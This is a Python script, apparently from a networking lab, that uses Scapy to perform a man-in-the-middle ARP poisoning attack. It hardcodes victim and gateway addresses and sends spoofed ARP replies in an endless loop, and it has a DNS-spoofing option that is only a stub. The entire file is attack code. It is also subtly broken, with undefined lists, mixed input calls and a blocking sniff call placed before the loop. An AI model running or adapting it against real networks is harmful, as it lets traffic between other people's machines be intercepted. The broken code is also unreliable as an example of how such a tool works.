# MITM ARP spoofing attack - using Scapy

# Imports
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR

# Victim 1
macVictimList.append("08:00:27:B7:C4:AF")
ipVictimList.append("10.0.2.5")

# Victim 2
macVictimList.append("52:54:00:12:35:00")
ipVictimList.append("10.0.2.1")

# The attacker
macAttacker = "08:00:27:D0:25:4B"
# ipAttacker = input("The IP address of the attacker: ")

# In enp0s9
# MAC Address M1: 08:00:27:B7:C4:AF
# IP Address M1: 10.0.2.5

# MAC Address Gateway: 52:54:00:12:35:00
# IP Address Gateway: 10.0.2.1

# MAC Address Attacker (M3): 08:00:27:D0:25:4B
# IP Address Attacker (M3): 10.0.2.4

# The main method to be ran by the user of our script
def main():
       typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
       if (typeOfAttack == 1):
           arp_poison()
       elif (typeOfAttack == 2):
           dns_spoof()
       else:
           print("No or wrong input.")

def arp_poison():
    # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
    nrOfHosts = int(input("The number of hosts you want to ARP poison: "))

    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2
    if (nrOfHosts < 2):
        print("A MITM ARP poisoning attack with less than 2 hosts is not possible.")
        print("The number of hosts you want to ARP poison: ")
        while (nrOfHosts < 2):
            nrOfHosts = input()

    macVictimList = []
    ipVictimList = []

    # The MAC and IP addresses of the victims and the attacker are obtained
    # victims must be separated into two groups, servers and hosts
    for i in range(nrOfHosts): 
        # Note: i + 1 is printed to the user of the software
        macVictimList.append(raw_input("The MAC address of the " + str(i+1) + "th victim:"))
        ipVictimList.append(raw_input("The IP address of the " + str(i+1) + "th victim:"))
    macAttacker = raw_input("The MAC address of the attacker: ")
    # ipAttacker = input("The IP address of the attacker: ")

    
    if (nrOfHosts == 2):
        # Send ARP package to victim 1 of spoofed IP victim 2
        arp1 = Ether() / ARP()
        arp1[Ether].src = macAttacker
        arp1[ARP].hwsrc = macAttacker
        arp1[ARP].psrc = ipVictimList[1]
        arp1[ARP].hwdst = macVictimList[0]
        arp1[ARP].pdst = ipVictimList[0]
        sendp(arp1, iface="enp0s9")

        # Send ARP package to victim 2 of spoofed IP victim 1
        arp2 = Ether() / ARP()
        arp2[Ether].src = macAttacker
        arp2[ARP].hwsrc = macAttacker
        arp2[ARP].psrc = ipVictimList[0]
        arp2[ARP].hwdst = macVictimList[1]
        arp2[ARP].pdst = ipVictimList[1]
        sendp(arp2, iface="enp0s9")
        
        # Call sniff to start sniffing for incoming packets from victims, and resend packets received via forward_packet
        sniff(iface = "enp0s9")

        # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
        while(True):
            # Send ARP package to victim 1 of spoofed IP victim 2
            sendp(arp1, iface="enp0s9")

            # Send ARP package to victim 2 of spoofed IP victim 1
            sendp(arp2, iface="enp0s9")

            # Timer
            time.sleep(3)

def dns_spoof():
    print("Has not yet been implemented.")

main()